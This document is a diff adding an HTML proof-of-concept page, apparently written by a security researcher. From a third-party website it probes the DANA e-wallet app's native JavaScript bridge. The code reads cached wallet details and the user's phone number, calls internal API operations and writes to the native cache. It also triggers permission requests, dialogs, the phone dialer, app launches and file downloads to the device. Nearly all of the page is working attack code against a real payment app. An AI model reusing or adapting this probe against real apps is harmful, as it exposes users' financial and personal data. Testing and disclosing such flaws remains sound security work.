@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v6</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:12px;margin:6px 0;font-size:14px;width:100%}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+</style>
+</head>
+<body>
+<div id="status">v6 starting...</div>
+<h3 style="color:#0ff">v6 - deep dive: mini-tunnel, shortlink, native cache, geo-name, native app launch, download, mini://</h3>
+<p class="note">RUN VIA: v4.html &rarr; OPEN v5 VIA callSubApp &rarr; (in v5) tap the v6 button. Let it run until DONE.</p>
+<p class="warn">EXPECTED NATIVE POPUPS (that is the point - just dismiss them): [12] a DANA-style dialog (tap its OK), [13] a DANA PERMISSION DIALOG - TAP DENY, [14] phone dialer - just close it, [15] Play Store page - just back out, [16] QR scanner - just back out. Then COPY ALL. Also check your Downloads/gallery afterwards for a file "poc_v6_dl..." from [17].</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+<h3>[1] requestApi partner.invoke (real operationType)</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] requestApi user.info.masking (real operationType)</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] createShortLink (arbitrary url - dana.id link?)</h3><pre id="p-3" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-3')">copy [3]</button>
+<h3>[4] nativeCache get walletDetail</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] nativeCache get phoneNumber</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] nativeCache save+get round-trip (poc key)</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] locationName (coords to place name)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] reverseGeocode (coords to address)</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] transactionStatus (listener mapping)</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] walletReload INVALID params (reachability only)</h3><pre id="p-10" class="pending">pending</pre>
+<h3>[11] getConsultOmni (gate contrast)</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] customDialog common (native dialog - POPUP EXPECTED)</h3><pre id="p-12" class="pending">pending</pre>
+<h3>[13] requestPermissions READ_CONTACTS (PERMISSION DIALOG - TAP DENY)</h3><pre id="p-13" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-13')">copy [13]</button>
+<h3>[14] openPhoneDialer (dialer opens - just close)</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] openNativeApp (Play Store opens - just back)</h3><pre id="p-15" class="pending">pending</pre>
+<h3>[16] scanQr (scanner opens - just back out)</h3><pre id="p-16" class="pending">pending</pre>
+<h3>[17] download generalDownload (file to device)</h3><pre id="p-17" class="pending">pending</pre>
+<h3>[18] downloadFile w/ filePath (Griver FileManager path)</h3><pre id="p-18" class="pending">pending</pre>
+<h3>[19] callSubApp mini:// (LAST - new container may open)</h3><pre id="p-19" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||12000}); } }, timeoutMs || 12000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+
+  window.copyAll = function(){
+    var lines = [];
+    Object.keys(RESULTS).forEach(function(k){ lines.push(k + ': ' + compact(RESULTS[k])); });
+    var ta = document.createElement('textarea');
+    ta.value = 'v6 @ ' + location.href + '\n' + lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  bridgeReady(async function(){
+    try {
+      var sp = {};
+      try { sp = (window.AlipayJSBridge && window.AlipayJSBridge.startupParams) || {}; } catch(e) { sp = {err:String(e)}; }
+      set('p-0', { hasAlipayJSBridge: !!window.AlipayJSBridge, appId: sp.appId, href: location.href });
+    } catch(e) { set('p-0', {error:String(e)}, 'err'); }
+
+    status('[1/20] requestApi partner.invoke');
+    set('p-1', await call('requestApi', {operationType:'id.dana.minitunnel.partner.invoke', payload:{}}, 15000));
+
+    status('[2/20] requestApi user.info.masking');
+    set('p-2', await call('requestApi', {operationType:'id.dana.minitunnel.user.info.masking', payload:{}}, 15000));
+
+    status('[3/20] createShortLink');
+    set('p-3', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 15000));
+
+    status('[4/20] nativeCache get walletDetail');
+    set('p-4', await call('nativeCache', {info:{event:'get', key:'walletDetail'}}, 12000));
+
+    status('[5/20] nativeCache get phoneNumber');
+    set('p-5', await call('nativeCache', {info:{event:'get', key:'phoneNumber'}}, 12000));
+
+    status('[6/20] nativeCache save+get round-trip');
+    var saveR = await call('nativeCache', {info:{event:'save', key:'poc_v6_probe', data:'poc_marker_v6'}}, 12000);
+    var getR  = await call('nativeCache', {info:{event:'get', key:'poc_v6_probe'}}, 12000);
+    set('p-6', {save: saveR, get: getR});
+
+    status('[7/20] locationName');
+    set('p-7', await call('locationName', {info:{lat:'-7.4254221', long:'111.3005175'}}, 15000));
+
+    status('[8/20] reverseGeocode');
+    set('p-8', await call('reverseGeocode', {info:{event:'reverseGeocode', lat:'-7.4254221', long:'111.3005175'}}, 15000));
+
+    status('[9/20] transactionStatus mapping');
+    set('p-9', await call('transactionStatus', {info:{transactionId:'POC_V6_PROBE'}}, 12000));
+
+    status('[10/20] walletReload INVALID params');
+    set('p-10', await call('walletReload', {event:'poc', info:{eventType:'poc', assetId:'poc', section:'poc'}}, 12000));
+
+    status('[11/20] getConsultOmni (gate contrast)');
+    set('p-11', await call('getConsultOmni', {info:{}}, 12000));
+
+    status('[12/20] customDialog - POPUP EXPECTED');
+    set('p-12', await call('customDialog', {event:'common', info:{title:'[PoC v6]', message:'This native dialog was requested by a third-party web page (rfypych.github.io). Tap OK.', button:'OK'}}, 20000));
+
+    status('[13/20] requestPermissions - DENY THE DIALOG');
+    set('p-13', await call('requestPermissions', {event:'request', info:{permissions:['android.permission.READ_CONTACTS']}}, 30000));
+
+    status('[14/20] openPhoneDialer - just close dialer');
+    set('p-14', await call('openPhoneDialer', {phoneNumber:'081200000000'}, 12000));
+
+    status('[15/20] openNativeApp - just back out');
+    set('p-15', await call('openNativeApp', {info:{urischeme:'market://details?id=com.whatsapp', packagename:'com.whatsapp'}}, 12000));
+
+    status('[16/20] scanQr - just back out of scanner');
+    set('p-16', await call('scanQr', {info:{codeConsumer:'native', scene:'v6poc'}}, 14000));
+
+    status('[17/20] download generalDownload');
+    set('p-17', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v6_dl', fileFormat:'.txt'}}, 20000));
+
+    status('[18/20] downloadFile with filePath');
+    set('p-18', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v6probe.txt', downloadTaskId:1}, 20000));
+
+    status('[19/20] callSubApp mini:// (LAST)');
+    set('p-19', await call('callSubApp', {url:'mini://?title=v6probe'}, 10000));
+
+    status('DONE - COPY ALL (and separately [3] and [13] if long)');
+  });
+})();
+</script>
+</body>
+</html>
